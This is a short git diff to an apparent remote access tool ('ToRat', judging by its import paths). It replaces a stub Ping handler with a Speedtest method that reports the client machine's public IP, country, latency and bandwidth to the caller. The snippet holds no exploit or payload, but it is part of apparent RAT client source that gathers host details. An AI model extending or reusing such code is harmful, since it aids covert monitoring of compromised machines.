@@ -12,6 +12,7 @@ import (
 	"github.com/lu4p/ToRat/shared"
 	"github.com/lu4p/ToRat/torat_client/crypto"
 	"github.com/lu4p/cat"
+	"github.com/showwin/speedtest-go/speedtest"
 	"github.com/vova616/screenshot"
 )
 
@@ -71,9 +72,34 @@ func (a *API) LS(v shared.Void, r *shared.Dir) (err error) {
 	return
 }
 
-func (a *API) Ping(v shared.Void, r *string) error {
-	// TODO implement
-	*r = "Pong"
+func (a *API) Speedtest(v shared.Void, r *shared.Speedtest) error {
+	user, err := speedtest.FetchUserInfo()
+	if err != nil {
+		return err
+	}
+
+	serverList, err := speedtest.FetchServerList(user)
+	if err != nil {
+		return err
+	}
+
+	targets, err := serverList.FindServer(nil)
+	if err != nil {
+		return err
+	}
+
+	for _, s := range targets {
+		s.PingTest()
+		s.DownloadTest(false)
+		s.UploadTest(false)
+
+		r.IP = user.IP
+		r.Download = s.DLSpeed
+		r.Upload = s.ULSpeed
+		r.Ping = s.Latency.String()
+		r.Country = s.Country
+	}
+
 	return nil
 }
 
